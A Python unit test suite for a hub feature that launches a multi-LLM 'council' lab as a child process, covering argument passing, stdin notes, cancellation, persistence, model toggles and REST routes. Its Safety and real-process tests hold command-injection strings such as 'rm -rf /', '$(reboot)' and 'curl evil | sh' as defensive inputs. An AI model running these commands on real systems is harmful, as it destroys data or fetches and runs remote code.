"""Council (hub/council.py, hub/council_tools.py): the multi-llm-lab CLI is a fake process that prints the agreed
JSON interface, so no model and no real lab is needed. A few tests run a tiny stand-in `lab` package with the
real Runner to prove the argument list reaches a real child unchanged (no shell) and notes arrive on stdin."""
import asyncio
import json
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from fastapi import FastAPI, HTTPException, Request
from fastapi.testclient import TestClient

from hub import council, council_tools
from hub.common import Ctx
from hub.devserver import FakeAssistant, FakeLLM, FakeTranscriber
from hub.server import Deps, create_app
from tests.fakes_assistant import reply, tool_block
from tests.helpers import TOKEN, make_config
from tests.test_assistant import Base as AssistantBase, collect, of

RESULT = {"status": "accepted", "answer": "Use a heap.", "files": ["out/solution.py"],
          "calls": {"qwen3:4b": 5, "gemini-flash": 2}, "stopped": None, "run_dir": ""}


class FakeProc:
    """Looks like an asyncio subprocess: stdout/stderr readers, wait(), returncode."""
    _next_pid = 4000

    def __init__(self):
        FakeProc._next_pid += 1
        self.pid = FakeProc._next_pid
        self.stdout = asyncio.StreamReader()
        self.stderr = asyncio.StreamReader()
        self.returncode = None
        self._done = asyncio.Event()
        self.killed = False

    def finish(self, code=0, out="", err=""):
        if err:
            self.stderr.feed_data(err.encode())
        if out:
            self.stdout.feed_data(out.encode())
        self.stdout.feed_eof()
        self.stderr.feed_eof()
        self.returncode = code
        self._done.set()

    async def wait(self):
        await self._done.wait()
        return self.returncode


class FakeRunner(council.Runner):
    def __init__(self):
        self.spawned = []      # (argv, cwd, env, stdin_text)
        self.procs = []
        self.once = []         # (argv)
        self.once_result = (0, "# Review packet\nAll good.", "")
        self.fail_spawn = False
        self.models = [
            {"name": "qwen", "provider": "ollama", "model": "qwen3:4b", "enabled": True, "ready": True,
             "reason": "", "kind": "local", "cost": "free"},
            {"name": "gemini-flash", "provider": "gemini", "model": "gemini-2.5-flash", "enabled": True,
             "ready": False, "reason": "no GEMINI_API_KEY", "kind": "hosted", "cost": "free"},
            {"name": "claude", "provider": "anthropic", "model": "claude-sonnet", "enabled": False, "ready": True,
             "reason": "", "kind": "hosted", "cost": "paid"}]
        self.models_ran = []

    async def spawn(self, argv, cwd, env, stdin_text):
        if self.fail_spawn:
            raise FileNotFoundError("no python")
        self.spawned.append((list(argv), cwd, env, stdin_text))
        proc = FakeProc()
        self.procs.append(proc)
        return proc

    async def kill(self, proc):
        proc.killed = True
        proc.finish(-9)

    async def run_once(self, argv, cwd, env, timeout, max_bytes):
        self.once.append(list(argv))
        if argv[3:4] == ["models"]:
            self.models_ran.append(list(argv[4:]))
            flag = argv[4]
            if flag.startswith(("--enable=", "--disable=")):
                name = flag.split("=", 1)[1]
                for m in self.models:
                    if m["name"] == name:
                        m["enabled"] = flag.startswith("--enable")
                return 0, "", ""
            return 0, json.dumps(self.models), ""
        return self.once_result


def need_auth(request: Request):
    if request.cookies.get("hub_session") != "yes":
        raise HTTPException(401, "Log in first.")


class CouncilBase(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="council-test-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.lab = self.tmp / "multi-llm-lab"
        (self.lab / "lab").mkdir(parents=True)
        self.runs = self.tmp / "runs"
        self.runs.mkdir()
        self.config, self.root = make_config(data_dir=str(self.tmp / "data"), council_dir=str(self.lab))
        self.addCleanup(shutil.rmtree, self.root, ignore_errors=True)
        self.notes = []
        self.audits = []
        self.runner = FakeRunner()
        self.mgr = self.new_manager()

    def new_manager(self, runner=None):
        ctx = Ctx(config=self.config, model_for=lambda p: None, transcriber=None, notes=None, need_auth=need_auth,
                  audit=lambda *a, **k: self.audits.append((a, k)),
                  notify=lambda *a, **k: self.notes.append(a))
        return council.CouncilManager(ctx, runner=runner or self.runner)

    def run_dir(self, name="run1"):
        d = self.runs / name
        d.mkdir(exist_ok=True)
        return str(d)

    async def settle(self, job_id=None, loops=30):
        for _ in range(loops):
            await asyncio.sleep(0)
        task = self.mgr.tasks.get(job_id) if job_id else None
        if task:
            await asyncio.wait_for(task, 10)

    async def finish_job(self, job_id, proc=None, **result):
        proc = proc or self.runner.procs[-1]
        data = {**RESULT, "run_dir": self.run_dir(), **result}
        proc.finish(0, json.dumps(data), "round 1 of 3\n")
        await self.settle(job_id)
        return self.mgr.get(job_id)


class RunStatusCancel(CouncilBase):
    async def test_run_returns_at_once_and_result_lands_when_done(self):
        job = self.mgr.start({"task": "sort a list", "verify_command": "pytest -q", "workers": 3, "rounds": 2,
                              "max_calls": 40})
        self.assertEqual(job["status"], "running")
        self.assertRegex(job["id"], r"^[0-9a-f]{12}$")
        await self.settle()
        argv, cwd, env, stdin = self.runner.spawned[0]
        self.assertEqual(argv[1:6], ["-m", "lab", "council", "--json", "--verify=pytest -q"])
        self.assertEqual(argv[-2:], ["--", "sort a list"])
        self.assertIn("--workers", argv)
        self.assertEqual(argv[argv.index("--max-calls") + 1], "40")
        self.assertEqual(cwd, str(self.lab))
        self.assertIsNone(stdin)
        self.runner.procs[0].stderr.feed_data(b"\x1b[32mround 1\x1b[0m done\n")
        await self.settle()
        self.assertIn("round 1 done", self.mgr.view(self.mgr.get(job["id"]))["log_tail"])
        self.assertNotIn("\x1b", self.mgr.view(self.mgr.get(job["id"]))["log_tail"])
        done = await self.finish_job(job["id"])
        self.assertEqual(done["status"], "accepted")
        view = self.mgr.view(done)
        self.assertEqual(view["result"]["calls"], {"qwen3:4b": 5, "gemini-flash": 2})
        self.assertEqual(view["result"]["answer"], "Use a heap.")
        self.assertFalse(view["running"])

    async def test_failed_stopped_and_unusable_output_statuses(self):
        for out, code, want in ((json.dumps({**RESULT, "status": "failed"}), 0, "failed"),
                                (json.dumps({**RESULT, "status": "stopped", "stopped": "budget"}), 0, "stopped"),
                                ("not json at all", 0, "error"), ("", 3, "error"),
                                (json.dumps({"status": "weird"}), 0, "error")):
            job = self.mgr.start({"task": "t"})
            await self.settle()
            self.runner.procs[-1].finish(code, out, "boom happened\n")
            await self.settle(job["id"])
            self.assertEqual(self.mgr.get(job["id"])["status"], want, out)
        last = self.mgr.view(self.mgr.get(job["id"]))
        self.assertIn("boom happened", last["error"])

    async def test_json_line_after_stdout_chatter_is_found(self):
        job = self.mgr.start({"task": "t"})
        await self.settle()
        self.runner.procs[-1].finish(0, "warming up\n" + json.dumps(RESULT) + "\n")
        await self.settle(job["id"])
        self.assertEqual(self.mgr.get(job["id"])["status"], "accepted")

    async def test_one_run_at_a_time(self):
        first = self.mgr.start({"task": "one"})
        with self.assertRaises(council.CouncilError) as cm:
            self.mgr.start({"task": "two"})
        self.assertEqual(cm.exception.status, 409)
        self.assertIn(first["id"], str(cm.exception))
        await self.settle()
        self.assertEqual(len(self.runner.spawned), 1)
        await self.finish_job(first["id"])
        self.mgr.start({"task": "two"})     # free again
        await self.settle()
        self.assertEqual(len(self.runner.spawned), 2)

    async def test_cancel_kills_the_process_and_records_it_without_a_notification(self):
        job = self.mgr.start({"task": "long one"})
        await self.settle()
        view = await self.mgr.cancel(job["id"])
        self.assertEqual(view["status"], "cancelled")
        self.assertTrue(self.runner.procs[0].killed)
        self.assertEqual(self.notes, [])
        with self.assertRaises(council.CouncilError):
            await self.mgr.cancel(job["id"])       # not running any more
        self.mgr.start({"task": "next"})           # and the slot is free

    async def test_hard_timeout_kills_the_run(self):
        self.config.council_timeout_min = 0.01     # clamped to one second
        job = self.mgr.start({"task": "never ends"})
        await self.settle()
        await self.mgr.tasks[job["id"]]
        done = self.mgr.get(job["id"])
        self.assertEqual(done["status"], "timeout")
        self.assertTrue(self.runner.procs[0].killed)
        self.assertIn("minutes", done["error"])
        self.assertEqual(self.notes[0][0], "Council timeout")

    async def test_spawn_failure_is_an_error_state_not_a_crash(self):
        self.runner.fail_spawn = True
        job = self.mgr.start({"task": "t"})
        await self.settle(job["id"])
        done = self.mgr.get(job["id"])
        self.assertEqual(done["status"], "error")
        self.assertIn("council_python", done["error"])

    async def test_notify_on_finish_with_status_and_first_200_chars(self):
        job = self.mgr.start({"task": "t"})
        await self.settle()
        await self.finish_job(job["id"], answer="word " * 100)
        title, body, level, link, source = self.notes[0]
        self.assertEqual(title, "Council accepted")
        self.assertEqual(len(body), 200)
        self.assertTrue(body.startswith("word word"))
        self.assertEqual((level, link, source), ("info", "council", "council"))
        job2 = self.mgr.start({"task": "t2"})
        await self.settle()
        self.runner.procs[-1].finish(1, "", "died\n")
        await self.settle(job2["id"])
        self.assertEqual(self.notes[1][0], "Council error")
        self.assertEqual(self.notes[1][2], "warn")

    async def test_a_notify_that_breaks_does_not_lose_the_result(self):
        ctx = self.mgr.ctx
        ctx.notify = mock.Mock(side_effect=RuntimeError("push down"))
        job = self.mgr.start({"task": "t"})
        await self.settle()
        done = await self.finish_job(job["id"])
        self.assertEqual(done["status"], "accepted")

    async def test_output_is_trimmed_to_safe_sizes(self):
        job = self.mgr.start({"task": "t"})
        await self.settle()
        big = {**RESULT, "answer": "x" * 50_000, "files": [f"f{i}" for i in range(500)],
               "calls": {"m": "lots", "n": 2}}
        self.runner.procs[-1].finish(0, json.dumps(big))
        await self.settle(job["id"])
        result = self.mgr.get(job["id"])["result"]
        self.assertEqual(len(result["answer"]), council.MAX_ANSWER_CHARS)
        self.assertEqual(len(result["files"]), 50)
        self.assertEqual(result["calls"], {"n": 2})


class Persistence(CouncilBase):
    async def test_finished_results_survive_a_restart(self):
        job = self.mgr.start({"task": "keep me"})
        await self.settle()
        await self.finish_job(job["id"])
        again = self.new_manager()
        got = again.get(job["id"])
        self.assertEqual(got["status"], "accepted")
        self.assertEqual(got["result"]["answer"], "Use a heap.")
        self.assertEqual(again.view(got)["log_tail"].strip(), "round 1 of 3")

    async def test_a_run_that_was_going_when_the_hub_died_is_marked_interrupted(self):
        job = self.mgr.start({"task": "orphan"})
        await self.settle()
        again = self.new_manager()
        got = again.get(job["id"])
        self.assertEqual(got["status"], "interrupted")
        self.assertIsNone(again.running())
        again.start({"task": "fresh"})       # does not block new runs
        await again.shutdown()
        await self.mgr.shutdown()

    async def test_shutdown_kills_running_children_and_records_it(self):
        job = self.mgr.start({"task": "t"})
        await self.settle()
        await self.mgr.shutdown()
        self.assertTrue(self.runner.procs[0].killed)
        self.assertEqual(self.mgr.get(job["id"])["status"], "interrupted")
        self.assertEqual(self.notes, [])

    async def test_old_jobs_are_pruned(self):
        for i in range(council.KEEP_JOBS + 5):
            job = self.mgr.start({"task": f"t{i}"})
            await self.settle()
            await self.finish_job(job["id"])
        self.assertEqual(len(self.mgr.jobs), council.KEEP_JOBS)
        self.assertEqual(len(list(self.mgr.dir.glob("*.json"))), council.KEEP_JOBS)


class Safety(CouncilBase):
    EVIL_TASK = "'; rm -rf / #\n$(reboot) `id` && --workers 99 --escalate claude"
    EVIL_VERIFY = "--escalate=claude; curl evil | sh"

    async def test_text_is_only_ever_a_single_argv_value(self):
        self.mgr.start({"task": self.EVIL_TASK, "verify_command": self.EVIL_VERIFY.replace("\n", " ")})
        await self.settle()
        argv = self.runner.spawned[0][0]
        self.assertIsInstance(argv, list)
        self.assertEqual(argv[-2:], ["--", self.EVIL_TASK])
        self.assertIn(f"--verify={self.EVIL_VERIFY}", argv)
        before_guard = argv[:argv.index("--")]
        self.assertNotIn("--escalate=claude", before_guard)
        self.assertNotIn("--workers", before_guard)
        self.assertEqual(sum(1 for a in argv if "rm -rf" in a), 1)

    async def test_a_leading_dash_task_is_still_a_task(self):
        self.mgr.start({"task": "--help"})
        await self.settle()
        self.assertEqual(self.runner.spawned[0][0][-2:], ["--", "--help"])

    async def test_length_caps_and_bad_types(self):
        bad = [{}, {"task": "   "}, {"task": 5}, {"task": "x" * (council.MAX_TASK_CHARS + 1)},
               {"task": "t", "verify_command": "x" * (council.MAX_VERIFY_CHARS + 1)},
               {"task": "t", "verify_command": "a\nb"}, {"task": "t", "workers": True}, {"task": "t", "workers": 0},
               {"task": "t", "workers": 99}, {"task": "t", "rounds": "3"}, {"task": "t", "max_calls": 1.5},
               {"task": "t", "notes": "n"}, "a string", None, {"task": "t", "escalate_claude": "yes"}]
        for body in bad:
            with self.subTest(body=str(body)[:40]):
                with self.assertRaises(council.CouncilError) as cm:
                    self.mgr.start(body)
                self.assertEqual(cm.exception.status, 400)
        self.assertEqual(self.runner.spawned, [])
        self.mgr.start({"task": "x" * council.MAX_TASK_CHARS})      # exactly at the cap is fine

    async def test_claude_escalation_only_when_the_owner_allowed_it(self):
        with self.assertRaises(council.CouncilError) as cm:
            self.mgr.start({"task": "t", "escalate_claude": True})
        self.assertIn("council_allow_claude", str(cm.exception))
        self.mgr.start({"task": "plain"})
        await self.settle()
        self.assertFalse([a for a in self.runner.spawned[0][0] if "escalate" in a])
        await self.finish_job(self.mgr.running()["id"])
        self.config.council_allow_claude = True
        self.mgr.start({"task": "ask claude", "escalate_claude": True})
        await self.settle()
        self.assertIn("--escalate=claude", self.runner.spawned[1][0])
        # allowed but not asked for: still not set
        await self.finish_job(self.mgr.running()["id"])
        self.mgr.start({"task": "no ask"})
        await self.settle()
        self.assertFalse([a for a in self.runner.spawned[2][0] if "escalate" in a])

    async def test_the_hubs_claude_key_is_not_handed_to_the_lab_unless_allowed(self):
        with mock.patch.dict(os.environ, {"ANTHROPIC_API_KEY": "sk-ant-test"}):
            self.mgr.start({"task": "t"})
            await self.settle()
            self.assertNotIn("ANTHROPIC_API_KEY", self.runner.spawned[0][2])
            await self.finish_job(self.mgr.running()["id"])
            self.config.council_allow_claude = True
            self.mgr.start({"task": "t"})
            await self.settle()
            self.assertEqual(self.runner.spawned[1][2]["ANTHROPIC_API_KEY"], "sk-ant-test")

    async def test_feature_off_when_council_dir_is_empty_or_not_a_lab(self):
        self.config.council_dir = ""
        self.assertFalse(self.mgr.status()["enabled"])
        with self.assertRaises(council.CouncilError) as cm:
            self.mgr.start({"task": "t"})
        self.assertEqual(cm.exception.status, 409)
        self.assertIn("python -m hub setup --only council", str(cm.exception))
        self.config.council_dir = str(self.tmp / "elsewhere")
        with self.assertRaises(council.CouncilError) as cm:
            self.mgr.start({"task": "t"})
        self.assertIn("multi-llm-lab", str(cm.exception))
        self.assertEqual(self.runner.spawned, [])

    async def test_job_ids_are_validated(self):
        for bad in ("../x", "short", "G" * 12, "", None, 5):
            with self.assertRaises(council.CouncilError) as cm:
                self.mgr.get(bad)
            self.assertEqual(cm.exception.status, 404)

    async def test_python_resolution(self):
        self.assertEqual(council.resolve_python(self.config), sys.executable)
        venv = council.venv_python(str(self.lab))
        venv.parent.mkdir(parents=True)
        venv.write_text("")
        self.assertEqual(council.resolve_python(self.config), str(venv))
        self.config.council_python = "/opt/py/python"
        self.assertEqual(council.resolve_python(self.config), "/opt/py/python")

    async def test_audit_never_holds_the_task_or_notes_text(self):
        self.mgr.start({"task": "secret plan details"})
        await self.settle()
        self.assertTrue(self.audits)
        self.assertNotIn("secret plan", json.dumps(self.audits))


class Rerun(CouncilBase):
    async def done_job(self, **kw):
        job = self.mgr.start({"task": "first task", "verify_command": "pytest", **kw})
        await self.settle()
        await self.finish_job(job["id"])
        return job["id"]

    async def test_notes_go_on_stdin_never_argv(self):
        base = await self.done_job()
        notes = "Claude says: the heap is wrong; --escalate=claude `rm -rf` $(x)\nline two"
        self.mgr.start({"resume_job_id": base, "notes": notes})
        await self.settle()
        argv, _, _, stdin = self.runner.spawned[1]
        self.assertEqual(stdin, notes)
        self.assertEqual(argv[argv.index("--notes") + 1], "-")
        self.assertTrue(any(a == f"--resume={self.run_dir()}" for a in argv))
        self.assertFalse(any("heap" in a or "rm -rf" in a for a in argv))
        self.assertNotIn("--escalate=claude", argv)
        self.assertEqual(argv[-2:], ["--", "first task"])      # task and verify are inherited
        self.assertIn("--verify=pytest", argv)
        job = self.mgr.running()
        self.assertEqual(job["resume_of"], base)
        self.assertEqual(job["notes_chars"], len(notes))
        self.assertNotIn("heap is wrong", json.dumps(job))     # notes text is not stored

    async def test_rerun_without_notes_has_no_notes_flag_and_stdin_is_closed(self):
        base = await self.done_job()
        self.mgr.start({"resume_job_id": base})
        await self.settle()
        argv, _, _, stdin = self.runner.spawned[1]
        self.assertNotIn("--notes", argv)
        self.assertIsNone(stdin)

    async def test_notes_cap(self):
        base = await self.done_job()
        with self.assertRaises(council.CouncilError):
            self.mgr.start({"resume_job_id": base, "notes": "n" * (council.MAX_NOTES_CHARS + 1)})
        self.mgr.start({"resume_job_id": base, "notes": "n" * council.MAX_NOTES_CHARS})

    async def test_rerun_needs_a_finished_run_with_a_real_run_folder(self):
        running = self.mgr.start({"task": "still going"})
        with self.assertRaises(council.CouncilError):
            self.mgr.start({"resume_job_id": running["id"]})
        await self.settle()
        self.runner.procs[0].finish(0, json.dumps({**RESULT, "run_dir": "/definitely/not/there"}))
        await self.settle(running["id"])
        with self.assertRaises(council.CouncilError) as cm:
            self.mgr.start({"resume_job_id": running["id"], "notes": "x"})
        self.assertIn("run folder", str(cm.exception))
        with self.assertRaises(council.CouncilError):
            self.mgr.start({"resume_job_id": "0" * 12})
        with self.assertRaises(council.CouncilError):
            self.mgr.start({"resume_job_id": "../../etc"})

    async def test_a_hostile_run_dir_from_the_lab_is_not_used(self):
        job = self.mgr.start({"task": "t"})
        await self.settle()
        self.runner.procs[0].finish(0, json.dumps({**RESULT, "run_dir": "-rf"}))
        await self.settle(job["id"])
        with self.assertRaises(council.CouncilError):
            self.mgr.start({"resume_job_id": job["id"]})
        with self.assertRaises(council.CouncilError):
            await self.mgr.review_packet(job["id"])


class ReviewPacket(CouncilBase):
    async def test_packet_comes_from_the_lab_and_is_capped(self):
        job = self.mgr.start({"task": "t"})
        await self.settle()
        await self.finish_job(job["id"])
        got = await self.mgr.review_packet(job["id"])
        self.assertEqual(got["packet"], "# Review packet\nAll good.")
        self.assertFalse(got["truncated"])
        argv = self.runner.once[0]
        self.assertEqual(argv[1:], ["-m", "lab", "review-packet", "--", self.run_dir()])
        self.runner.once_result = (0, "y" * (council.MAX_PACKET_CHARS + 500), "")
        got = await self.mgr.review_packet(job["id"])
        self.assertTrue(got["truncated"])
        self.assertEqual(len(got["packet"]), council.MAX_PACKET_CHARS)

    async def test_packet_errors_are_sentences(self):
        job = self.mgr.start({"task": "t"})
        await self.settle()
        await self.finish_job(job["id"])
        self.runner.once_result = (2, "", "usage: lab ... invalid choice: 'review-packet'\n")
        with self.assertRaises(council.CouncilError) as cm:
            await self.mgr.review_packet(job["id"])
        self.assertEqual(cm.exception.status, 502)
        self.assertIn("review-packet", str(cm.exception))
        self.runner.once_result = (None, "", "")
        with self.assertRaises(council.CouncilError) as cm:
            await self.mgr.review_packet(job["id"])
        self.assertEqual(cm.exception.status, 504)

    async def test_no_packet_for_a_run_still_going(self):
        job = self.mgr.start({"task": "t"})
        with self.assertRaises(council.CouncilError) as cm:
            await self.mgr.review_packet(job["id"])
        self.assertEqual(cm.exception.status, 409)
        await self.settle()


class Models(CouncilBase):
    async def test_list_is_cleaned_and_claude_is_locked_with_a_note(self):
        rows = await self.mgr.models()
        by = {r["name"]: r for r in rows}
        self.assertEqual(self.runner.once[0][1:], ["-m", "lab", "models", "--json"])
        self.assertFalse(by["gemini-flash"]["ready"])
        self.assertEqual(by["gemini-flash"]["reason"], "no GEMINI_API_KEY")
        self.assertFalse(by["qwen"]["paid"])
        self.assertTrue(by["claude"]["paid"] and by["claude"]["claude"] and by["claude"]["locked"])
        self.assertFalse(by["claude"]["enabled"])
        self.assertIn("Off by default", by["claude"]["note"])
        self.assertNotIn("note", by["qwen"])

    async def test_toggle_runs_the_cli_with_one_argv_value_and_returns_the_new_list(self):
        rows = await self.mgr.set_model("qwen", False)
        self.assertEqual(self.runner.models_ran[-2], ["--disable=qwen"])
        self.assertFalse(next(r for r in rows if r["name"] == "qwen")["enabled"])
        rows = await self.mgr.set_model("qwen", True)
        self.assertEqual(self.runner.models_ran[-2], ["--enable=qwen"])
        self.assertTrue(next(r for r in rows if r["name"] == "qwen")["enabled"])

    async def test_names_are_validated_and_must_be_listed(self):
        for bad in ("../x", "a b", "x;rm", "", "a" * 65, "$(id)", "--enable=all"[:0] + "a/b"):
            with self.assertRaises(council.CouncilError) as cm:
                await self.mgr.set_model(bad, True)
            self.assertEqual(cm.exception.status, 400, bad)
        with self.assertRaises(council.CouncilError) as cm:
            await self.mgr.set_model("--all", True)        # valid characters, but not a listed model
        self.assertEqual(cm.exception.status, 404)
        with self.assertRaises(council.CouncilError) as cm:
            await self.mgr.set_model("qwen", "yes")
        self.assertEqual(cm.exception.status, 400)
        self.assertEqual(self.runner.models_ran and [a for a in self.runner.models_ran if "--" in a[0] and "=" in a[0]], [])

    async def test_claude_cannot_be_switched_on_unless_the_owner_allowed_it(self):
        with self.assertRaises(council.CouncilError) as cm:
            await self.mgr.set_model("claude", True)
        self.assertEqual(cm.exception.status, 409)
        self.config.council_allow_claude = True
        rows = await self.mgr.set_model("claude", True)
        self.assertTrue(next(r for r in rows if r["name"] == "claude")["enabled"])

    async def test_cli_problems_are_sentences(self):
        orig = self.runner.run_once

        async def broken(argv, *a):
            self.runner.once.append(argv)
            return 2, "", "invalid choice: 'models'\n"
        self.runner.run_once = broken
        with self.assertRaises(council.CouncilError) as cm:
            await self.mgr.models()
        self.assertEqual(cm.exception.status, 502)
        self.assertIn("models --json", str(cm.exception))

        async def junk(argv, *a):
            return 0, "not json", ""
        self.runner.run_once = junk
        with self.assertRaises(council.CouncilError):
            await self.mgr.models()
        self.runner.run_once = orig

    async def test_only_and_skip_per_run(self):
        self.mgr.start({"task": "t", "only": ["qwen", "gemini-flash"], "skip": ["x.y:z"]})
        await self.settle()
        argv = self.runner.spawned[0][0]
        self.assertIn("--only=qwen,gemini-flash", argv)
        self.assertIn("--skip=x.y:z", argv)
        self.assertLess(argv.index("--only=qwen,gemini-flash"), argv.index("--"))
        self.assertEqual(self.mgr.running()["options"]["only"], ["qwen", "gemini-flash"])

    async def test_only_skip_are_checked(self):
        for bad in ({"only": "qwen"}, {"only": ["a,b"]}, {"only": ["a b"]}, {"only": [5]},
                    {"skip": ["--x; rm"]}, {"only": ["n%d" % i for i in range(30)]},
                    {"only": ["claude"]}, {"only": ["claude-sonnet"]}):
            with self.subTest(bad=str(bad)[:30]):
                with self.assertRaises(council.CouncilError):
                    self.mgr.start({"task": "t", **bad})
        self.assertEqual(self.runner.spawned, [])
        self.mgr.start({"task": "t", "skip": ["claude"]})       # leaving Claude out is always fine


# ------------------------------------------------------------------------------- real child processes

LAB_MAIN = r'''
import json, os, sys, time
args = sys.argv[1:]
out = os.environ.get("FAKE_LAB_OUT")
if args and args[0] == "council":
    notes = None
    if "--notes" in args:
        notes = sys.stdin.read()
    if out:
        with open(out, "w", encoding="utf-8") as f:
            json.dump({"argv": args, "notes": notes, "cwd": os.getcwd()}, f)
    if "sleep" in " ".join(args):
        sys.stderr.write("sleeping\n"); sys.stderr.flush()
        time.sleep(60)
    print(json.dumps({"status": "accepted", "answer": "ok", "files": [], "calls": {"fake": 1}, "stopped": None,
                      "run_dir": os.environ.get("FAKE_RUN_DIR", "")}))
elif args and args[0] == "models":
    if out:
        with open(out + ".models", "w", encoding="utf-8") as f:
            json.dump(args, f)
    print(json.dumps([{"name": "m1", "provider": "p", "model": "x", "enabled": True, "ready": True,
                       "reason": "", "kind": "local", "cost": "free"}]))
else:
    print("# packet for", args[-1])
'''


class RealProcesses(CouncilBase):
    def setUp(self):
        super().setUp()
        (self.lab / "lab" / "__init__.py").write_text("")
        (self.lab / "lab" / "__main__.py").write_text(LAB_MAIN)
        self.out = self.tmp / "seen.json"
        patcher = mock.patch.dict(os.environ, {"FAKE_LAB_OUT": str(self.out), "FAKE_RUN_DIR": self.run_dir()})
        patcher.start()
        self.addCleanup(patcher.stop)
        self.mgr = self.new_manager(runner=council.Runner())

    async def wait_done(self, job_id, timeout=30):
        await asyncio.wait_for(self.mgr.tasks[job_id], timeout)
        return self.mgr.get(job_id)

    async def test_hostile_text_reaches_a_real_child_as_literal_arguments(self):
        task = "$(touch /tmp/pwned) ; `id` | cat > /dev/null & --workers 77 \"quoted\" 'single'"
        verify = "-x; echo hi && exit 1"
        job = self.mgr.start({"task": task, "verify_command": verify})
        done = await self.wait_done(job["id"])
        self.assertEqual(done["status"], "accepted", done)
        seen = json.loads(self.out.read_text())
        self.assertEqual(seen["argv"][-2:], ["--", task])
        self.assertIn(f"--verify={verify}", seen["argv"])
        self.assertNotIn("--workers", seen["argv"])
        self.assertEqual(Path(seen["cwd"]).resolve(), self.lab.resolve())

    async def test_notes_arrive_on_stdin_of_a_real_child(self):
        first = self.mgr.start({"task": "first"})
        await self.wait_done(first["id"])
        notes = "multi\nline $(x) `y` \"z\" notes é"
        job = self.mgr.start({"resume_job_id": first["id"], "notes": notes})
        done = await self.wait_done(job["id"])
        self.assertEqual(done["status"], "accepted", done)
        seen = json.loads(self.out.read_text())
        self.assertEqual(seen["notes"], notes)
        self.assertNotIn(notes, " ".join(seen["argv"]))

    @unittest.skipIf(sys.platform == "win32", "process-group check uses POSIX signals")
    async def test_cancel_really_kills_the_real_child(self):
        job = self.mgr.start({"task": "sleep please"})
        for _ in range(100):
            await asyncio.sleep(0.1)
            pid = self.mgr.get(job["id"]).get("pid")
            if pid and "sleeping" in self.mgr.get(job["id"])["log_tail"]:
                break
        else:
            self.fail("the child never started")
        view = await self.mgr.cancel(job["id"])
        self.assertEqual(view["status"], "cancelled")
        with self.assertRaises(ProcessLookupError):
            for _ in range(50):
                os.kill(pid, 0)
                await asyncio.sleep(0.1)
            os.kill(pid, 0)

    async def test_real_models_toggle_passes_one_literal_argument(self):
        rows = await self.mgr.set_model("m1", False)
        self.assertEqual(rows[0]["name"], "m1")
        self.assertEqual(json.loads(Path(str(self.out) + ".models").read_text()), ["models", "--json"])

    async def test_real_review_packet(self):
        job = self.mgr.start({"task": "t"})
        await self.wait_done(job["id"])
        got = await self.mgr.review_packet(job["id"])
        self.assertIn("# packet for", got["packet"])
        self.assertIn(self.run_dir(), got["packet"])


# ---------------------------------------------------------------------------------------- the REST routes

class Endpoints(CouncilBase):
    def setUp(self):
        super().setUp()
        self.config.default_provider = "local"
        self.runner = FakeRunner()
        patcher = mock.patch.object(council, "Runner", lambda: self.runner)
        patcher.start()
        self.addCleanup(patcher.stop)
        deps = Deps(llm=FakeLLM(), claude=FakeLLM(), transcriber=FakeTranscriber(), assistant=FakeAssistant())
        self.app = create_app(self.config, deps, audit_path=self.root / "audit.log")
        self.client = TestClient(self.app, base_url="http://testserver", headers={"X-Hub": "1"})
        self.client.__enter__()
        self.addCleanup(self.client.__exit__, None, None, None)

    def login(self):
        self.assertEqual(self.client.post("/api/login", json={"token": TOKEN}).status_code, 200)

    def wait_for(self, job_id, status=None, tries=100):
        import time
        for _ in range(tries):
            data = self.client.get(f"/api/council/jobs/{job_id}").json()
            if (status and data["status"] == status) or (not status and not data["running"]):
                return data
            time.sleep(0.05)
        self.fail(f"job never reached {status}: {data}")

    def test_everything_needs_a_login(self):
        for method, path in (("GET", "/api/council/status"), ("POST", "/api/council/run"),
                             ("GET", "/api/council/jobs"), ("GET", f"/api/council/jobs/{'a' * 12}"),
                             ("POST", f"/api/council/jobs/{'a' * 12}/cancel"),
                             ("GET", f"/api/council/jobs/{'a' * 12}/review-packet")):
            with self.subTest(path=path):
                r = self.client.request(method, path, json={"task": "x"} if method == "POST" else None)
                self.assertEqual(r.status_code, 401)
        self.assertEqual(self.runner.spawned, [])

    def test_posts_without_the_app_header_are_refused(self):
        self.login()
        for path in ("/api/council/run", f"/api/council/jobs/{'a' * 12}/cancel"):
            r = self.client.post(path, json={"task": "x"}, headers={"X-Hub": ""})
            self.assertEqual(r.status_code, 403, path)
        self.assertEqual(self.runner.spawned, [])

    def test_run_status_list_detail_cancel_and_packet(self):
        self.login()
        st = self.client.get("/api/council/status").json()
        self.assertTrue(st["enabled"] and st["ready"])
        self.assertNotIn(str(self.lab), json.dumps(st))          # only the folder's name is shown
        r = self.client.post("/api/council/run", json={"task": "do the thing", "workers": 2})
        self.assertEqual(r.status_code, 200, r.text)
        job = r.json()
        self.assertTrue(job["running"])
        self.assertEqual(self.client.post("/api/council/run", json={"task": "again"}).status_code, 409)
        self.assertEqual(self.client.get("/api/council/status").json()["running_job"], job["id"])
        rows = self.client.get("/api/council/jobs").json()["jobs"]
        self.assertEqual([x["id"] for x in rows], [job["id"]])
        self.assertNotIn("log_tail", rows[0])
        cancelled = self.client.post(f"/api/council/jobs/{job['id']}/cancel").json()
        self.assertEqual(cancelled["status"], "cancelled")
        self.assertEqual(self.client.post(f"/api/council/jobs/{job['id']}/cancel").status_code, 409)
        job2 = self.client.post("/api/council/run", json={"task": "second"}).json()
        import time
        for _ in range(100):
            if self.runner.procs and len(self.runner.procs) == 2:
                break
            time.sleep(0.05)
        self.client.portal  # keep the app's loop alive while the fake finishes
        self.runner.procs[1].finish(0, json.dumps({**RESULT, "run_dir": self.run_dir()}))
        done = self.wait_for(job2["id"])
        self.assertEqual(done["status"], "accepted")
        packet = self.client.get(f"/api/council/jobs/{job2['id']}/review-packet")
        self.assertEqual(packet.status_code, 200, packet.text)
        self.assertIn("Review packet", packet.json()["packet"])
        # a rerun with notes through the route
        again = self.client.post("/api/council/run", json={"resume_job_id": job2["id"], "notes": "try harder"})
        self.assertEqual(again.status_code, 200, again.text)

    def test_bad_input_is_a_400_and_unknown_ids_are_404(self):
        self.login()
        self.assertEqual(self.client.post("/api/council/run", json={"task": ""}).status_code, 400)
        self.assertEqual(self.client.post("/api/council/run", json=["x"]).status_code, 400)
        self.assertEqual(self.client.post("/api/council/run", json={"task": "t", "escalate_claude": True}).status_code, 400)
